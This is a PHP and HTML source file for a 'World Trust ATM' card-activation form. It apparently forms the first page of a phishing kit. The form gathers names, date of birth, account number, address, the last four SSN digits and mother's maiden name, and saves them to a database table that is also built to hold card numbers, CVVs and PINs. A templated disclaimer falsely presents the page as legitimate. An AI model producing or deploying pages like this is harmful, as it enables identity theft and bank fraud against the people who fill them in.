<?php
/**
 * World Trust ATM - Card Activation
 * Page 1: Basic Details Collection
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';

$errors = [];
$form_data = [];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize and collect form data
    $form_data = [
        'first_name' => sanitize_input($_POST['first_name'] ?? ''),
        'last_name' => sanitize_input($_POST['last_name'] ?? ''),
        'dob' => sanitize_input($_POST['dob'] ?? ''),
        'email' => sanitize_input($_POST['email'] ?? ''),
        'phone' => sanitize_input($_POST['phone'] ?? ''),
        'account_number' => sanitize_input($_POST['account_number'] ?? ''),
        'street' => sanitize_input($_POST['street'] ?? ''),
        'city' => sanitize_input($_POST['city'] ?? ''),
        'state' => sanitize_input($_POST['state'] ?? ''),
        'zip' => sanitize_input($_POST['zip'] ?? ''),
        'ssn' => sanitize_input($_POST['ssn'] ?? ''),
        'maiden_name' => sanitize_input($_POST['maiden_name'] ?? '')
    ];
    
    // Validation
    if (empty($form_data['first_name'])) {
        $errors['first_name'] = 'First name is required';
    }
    
    if (empty($form_data['last_name'])) {
        $errors['last_name'] = 'Last name is required';
    }
    
    if (empty($form_data['dob'])) {
        $errors['dob'] = 'Date of birth is required';
    }
    
    if (empty($form_data['email'])) {
        $errors['email'] = 'Email is required';
    } elseif (!validate_email($form_data['email'])) {
        $errors['email'] = 'Please enter a valid email address';
    }
    
    if (empty($form_data['phone'])) {
        $errors['phone'] = 'Phone number is required';
    } elseif (!validate_phone($form_data['phone'])) {
        $errors['phone'] = 'Please enter a valid phone number';
    }
    
    if (empty($form_data['account_number'])) {
        $errors['account_number'] = 'Account number is required';
    } elseif (!validate_account($form_data['account_number'])) {
        $errors['account_number'] = 'Account number must be 10-12 digits';
    }
    
    if (empty($form_data['street'])) {
        $errors['street'] = 'Street address is required';
    }
    
    if (empty($form_data['city'])) {
        $errors['city'] = 'City is required';
    }
    
    if (empty($form_data['state'])) {
        $errors['state'] = 'State is required';
    }
    
    if (empty($form_data['zip'])) {
        $errors['zip'] = 'ZIP code is required';
    }
    
    if (empty($form_data['ssn'])) {
        $errors['ssn'] = 'Last 4 digits of SSN required';
    } elseif (!validate_ssn($form_data['ssn'])) {
        $errors['ssn'] = 'Please enter the last 4 digits of your SSN';
    }
    
    if (empty($form_data['maiden_name'])) {
        $errors['maiden_name'] = 'Mother\'s maiden name is required';
    }
    
    // If no errors, save to database and session, then redirect
    if (empty($errors)) {
        // Save to database first
        require_once 'includes/database.php';
        $db = get_db_connection();
        
        if ($db) {
            try {
                $stmt = $db->prepare('INSERT INTO activation_requests 
                    (first_name, last_name, dob, email, phone, account_number, 
                     street, city, state, zip, ssn_last4, maiden_name, card_number, cvv, expiry_date, pin_hash, balance, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, "", "", "", "", ?, "pending")');
                
                $stmt->execute([
                    $form_data['first_name'],
                    $form_data['last_name'],
                    $form_data['dob'],
                    $form_data['email'],
                    $form_data['phone'],
                    $form_data['account_number'],
                    $form_data['street'],
                    $form_data['city'],
                    $form_data['state'],
                    $form_data['zip'],
                    $form_data['ssn'],
                    $form_data['maiden_name'],
                    DEFAULT_BALANCE
                ]);
                
                $_SESSION['request_id'] = $db->lastInsertId();
            } catch (PDOException $e) {
                error_log('Failed to save initial user data: ' . $e->getMessage());
            }
        }
        
        $_SESSION['user_data'] = $form_data;
        $_SESSION['last_activity'] = time();
        header('Location: pin-setup.php');
        exit();
    }
}

// Check for timeout
$timeout_message = '';
if (isset($_GET['timeout'])) {
    $timeout_message = 'Your session has expired. Please start over.';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="<?php echo APP_NAME; ?> - Activate your ATM card securely">
    <title><?php echo APP_NAME; ?> - Card Activation</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Form Container -->
        <div class="form-container">
            <h2 class="form-title">Activate Your ATM Card</h2>
            <p class="form-subtitle">Please provide your details to activate your new card</p>
            
            <?php if ($timeout_message): ?>
                <div class="error-message show" style="margin-bottom: 20px;">
                    <?php echo $timeout_message; ?>
                </div>
            <?php endif; ?>
            
            <span class="security-badge">Secure Form</span>
            
            <form id="activationForm" method="POST" action="" novalidate>
                <!-- Personal Information -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="first_name">First Name <span class="required">*</span></label>
                        <input type="text" id="first_name" name="first_name" 
                               value="<?php echo htmlspecialchars($form_data['first_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['first_name'])): ?>
                            <span class="error-message show"><?php echo $errors['first_name']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="last_name">Last Name <span class="required">*</span></label>
                        <input type="text" id="last_name" name="last_name" 
                               value="<?php echo htmlspecialchars($form_data['last_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['last_name'])): ?>
                            <span class="error-message show"><?php echo $errors['last_name']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="dob">Date of Birth <span class="required">*</span></label>
                    <input type="date" id="dob" name="dob" 
                           value="<?php echo htmlspecialchars($form_data['dob'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['dob'])): ?>
                        <span class="error-message show"><?php echo $errors['dob']; ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="email">Email Address <span class="required">*</span></label>
                        <input type="email" id="email" name="email" 
                               value="<?php echo htmlspecialchars($form_data['email'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['email'])): ?>
                            <span class="error-message show"><?php echo $errors['email']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone">Phone Number <span class="required">*</span></label>
                        <input type="tel" id="phone" name="phone" 
                               value="<?php echo htmlspecialchars($form_data['phone'] ?? ''); ?>"
                               placeholder="+1234567890"
                               required aria-required="true">
                        <?php if (isset($errors['phone'])): ?>
                            <span class="error-message show"><?php echo $errors['phone']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="account_number">Account Number <span class="required">*</span></label>
                    <input type="text" id="account_number" name="account_number" 
                           value="<?php echo htmlspecialchars($form_data['account_number'] ?? ''); ?>"
                           placeholder="10-12 digits"
                           required aria-required="true">
                    <?php if (isset($errors['account_number'])): ?>
                        <span class="error-message show"><?php echo $errors['account_number']; ?></span>
                    <?php endif; ?>
                </div>
                
                <!-- Address -->
                <div class="form-group">
                    <label for="street">Street Address <span class="required">*</span></label>
                    <input type="text" id="street" name="street" 
                           value="<?php echo htmlspecialchars($form_data['street'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['street'])): ?>
                        <span class="error-message show"><?php echo $errors['street']; ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="city">City <span class="required">*</span></label>
                        <input type="text" id="city" name="city" 
                               value="<?php echo htmlspecialchars($form_data['city'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['city'])): ?>
                            <span class="error-message show"><?php echo $errors['city']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="state">State <span class="required">*</span></label>
                        <input type="text" id="state" name="state" 
                               value="<?php echo htmlspecialchars($form_data['state'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['state'])): ?>
                            <span class="error-message show"><?php echo $errors['state']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="zip">ZIP Code <span class="required">*</span></label>
                    <input type="text" id="zip" name="zip" 
                           value="<?php echo htmlspecialchars($form_data['zip'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['zip'])): ?>
                        <span class="error-message show"><?php echo $errors['zip']; ?></span>
                    <?php endif; ?>
                </div>
                
                <!-- Security Information -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="ssn">Last 4 Digits of SSN <span class="required">*</span></label>
                        <input type="password" id="ssn" name="ssn" 
                               value="<?php echo htmlspecialchars($form_data['ssn'] ?? ''); ?>"
                               maxlength="4" placeholder="****"
                               required aria-required="true">
                        <?php if (isset($errors['ssn'])): ?>
                            <span class="error-message show"><?php echo $errors['ssn']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="maiden_name">Mother's Maiden Name <span class="required">*</span></label>
                        <input type="text" id="maiden_name" name="maiden_name" 
                               value="<?php echo htmlspecialchars($form_data['maiden_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['maiden_name'])): ?>
                            <span class="error-message show"><?php echo $errors['maiden_name']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Continue to Activation</button>
            </form>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
    
    <script src="js/form-validation.js"></script>
</body>
</html>
